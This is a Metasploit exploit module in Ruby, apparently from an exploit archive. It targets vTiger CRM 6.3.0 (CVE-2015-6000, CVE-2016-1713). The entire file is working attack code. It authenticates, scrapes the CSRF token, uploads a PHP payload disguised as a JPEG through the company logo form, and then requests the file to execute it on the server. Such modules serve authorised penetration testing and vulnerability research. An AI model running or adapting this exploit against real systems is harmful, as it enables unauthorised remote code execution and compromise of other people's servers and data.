# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Vtiger CRM - Authenticated Logo Upload RCE&#039;,
      &#039;Description&#039; => %q{
        Vtiger 6.3.0 CRM&#039;s administration interface allows for the upload of a company logo.
        Instead of uploading an image, an attacker may choose to upload a file containing PHP code and
        run this code by accessing the resulting PHP file.

        This module was tested against vTiger CRM v6.3.0.
      },
      &#039;Author&#039; =>
        [
          &#039;Benjamin Daniel Mussler&#039;, # Discoverys
          &#039;Touhid M.Shaikh <touhidshaikh22@gmail.com>&#039;, # Metasploit Module
          &#039;SecureLayer7.net&#039; # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2015-6000&#039;],
          [&#039;CVE&#039;,&#039;2016-1713&#039;],
          [&#039;EDB&#039;, &#039;38345&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;Encoder&#039; => &#039;php/base64&#039;,
          &#039;RPORT&#039; => 8888
        },
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [&#039;vTiger CRM v6.3.0&#039;, {}],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 28 2015&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base vTiger CRM directory path&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Username to authenticate with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Password to authenticate with&#039;, &#039;&#039;])
      ])

    register_advanced_options(
      [
        OptBool.new(&#039;PHPSHORTTAG&#039;, [true, &#039;Use short open php tags around payload&#039;, true])
      ])
  end

  def check
    res = send_request_cgi({ &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;) })

    unless res
      vprint_error("Unable to access the index.php file")
      return CheckCode::Unknown
    end

    unless res.code == 200
      vprint_error("Error accessing the index.php file")
      return CheckCode::Unknown
    end

    if res.body =~ /<small> Powered by vtiger CRM (.*.0)<\/small>/i
      vprint_status("vTiger CRM version: #{$1}")
      if $1 == &#039;6.3.0&#039;
        return CheckCode::Vulnerable
      else
        return CheckCode::Detected
      end
    end

    CheckCode::Safe
  end

  # Login Function.
  def login
    # Dummy Request for grabbing CSRF token and PHPSESSION ID
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vhost&#039; => "#{rhost}",
    })

    # Grabbing CSRF token from body
    /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_good("CSRF Token for login: #{csrf}")

    # Get Login now.
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;Users&#039;,
        &#039;action&#039; => &#039;Login&#039;,
      },
      &#039;vars_post&#039; => {
        &#039;__vtrftk&#039; => csrf,
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      },
    })

    unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request")
    end

    cookie = nil
    if res.code == 302 && res.headers[&#039;Location&#039;].include?("index.php?module=Users&parent=Settings&view=SystemSetup")
      vprint_good("Authentication successful: #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
      cookie = res.get_cookies.split[-1]
    end

    unless cookie
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]} ]")
    end

    cookie
  end

  def exploit
    cookie = login
    unless cookie
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed")
    end

    pay_name = rand_text_alpha(rand(5..10)) + ".php"

    # Retrieve CSRF token
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vhost&#039; => "#{rhost}",
      &#039;cookie&#039; => cookie
    })

    # Grabbing CSRF token from body
    /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_good("CSRF Token for Form Upload: #{csrf}")

    stager = datastore[&#039;PHPSHORTTAG&#039;] ? &#039;<? &#039; : &#039;<?php &#039;
    stager << payload.encoded
    stager << &#039; ?>&#039;

    # Setting Company Form data
    post_data = Rex::MIME::Message.new
    post_data.add_part(csrf, nil, nil, "form-data; name=\"__vtrftk\"") # CSRF token
    post_data.add_part(&#039;Vtiger&#039;, nil, nil, "form-data; name=\"module\"")
    post_data.add_part(&#039;Settings&#039;, nil, nil, "form-data; name=\"parent\"")
    post_data.add_part(&#039;CompanyDetailsSave&#039;, nil, nil, "form-data; name=\"action\"")
    post_data.add_part(stager, "image/jpeg", nil, "form-data; name=\"logo\"; filename=\"#{pay_name}\"")
    post_data.add_part(&#039;vtiger&#039;, nil, nil, "form-data; name=\"organizationname\"")
    data = post_data.to_s

    print_status("Uploading payload: #{pay_name}")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vhost&#039; => "#{rhost}",
      &#039;cookie&#039; => cookie,
      &#039;connection&#039; => &#039;close&#039;,
      &#039;headers&#039; => {
        &#039;Referer&#039; => "http://#{peer}/index.php?parent=Settings&module=Vtiger&view=CompanyDetails",
        &#039;Upgrade-Insecure-Requests&#039; => &#039;1&#039;,
      },
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
    })

    unless res && res.code == 302
      fail_with(Failure::None, "#{peer} - File wasn&#039;t uploaded, aborting!")
    end

    # Cleanup file
    register_files_for_cleanup(pay_name)

    vprint_status("Executing Payload: #{peer}/test/logo/#{pay_name}" )
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, "test", "logo", pay_name)
    })

    if res && res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Payload not executed")
    end
  end
end

